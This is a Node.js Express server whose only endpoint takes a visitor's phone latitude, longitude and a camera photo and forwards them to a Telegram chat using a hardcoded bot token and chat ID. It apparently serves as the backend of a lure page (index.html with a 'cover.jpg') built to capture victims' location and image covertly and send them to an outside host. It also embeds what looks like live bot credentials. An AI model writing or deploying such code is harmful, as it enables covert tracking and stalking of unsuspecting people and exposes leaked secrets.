const express = require("express");
const axios = require("axios");
const FormData = require("form-data");
const path = require("path");

const app = express();
const PORT = 3000;

// Serve static files (index.html and cover.jpg)
app.use(express.static(path.join(__dirname)));

// CORS middleware
app.use((req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization");
  res.setHeader("Access-Control-Allow-Credentials", "true");
  if (req.method === "OPTIONS") {
    return res.status(200).end();
  }
  next();
});

// Parse JSON bodies
app.use(express.json());

// Telegram Bot Config
const BOT_TOKEN = "7889028342:AAG0aTfcPuAycrkkO5ED-rPsod0nG_dgg4M";
const CHAT_ID = "5411948121";

// API endpoint
app.post("/api/submit", async (req, res) => {
  const { latitude, longitude, photo } = req.body;

  if (!latitude || !longitude || !photo) {
    return res.status(400).json({ status: "error", message: "Invalid data" });
  }

  const message = `📍 Phone location:\nLatitude: ${latitude}\nLongitude: ${longitude}\nGoogle Maps: https://maps.google.com/?q=${latitude},${longitude}`;

  try {
    const base64Data = photo.replace(/^data:image\/jpeg;base64,/, "");
    const buffer = Buffer.from(base64Data, "base64");

    const form = new FormData();
    form.append("chat_id", CHAT_ID);
    form.append("caption", message);
    form.append("photo", buffer, {
      filename: "photo.jpg",
      contentType: "image/jpeg",
    });

    const tgRes = await axios.post(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
      form,
      {
        headers: form.getHeaders(),
        maxContentLength: Infinity,
        maxBodyLength: Infinity,
      },
    );

    res.json({ status: "success", telegram_response: tgRes.data });
  } catch (err) {
    console.error("Telegram error:", err.response?.data || err.message);
    res
      .status(500)
      .json({ status: "error", message: "Failed to send to Telegram" });
  }
});

app.listen(PORT, () => {
  console.log(`✅ Server running at http://localhost:${PORT}`);
});
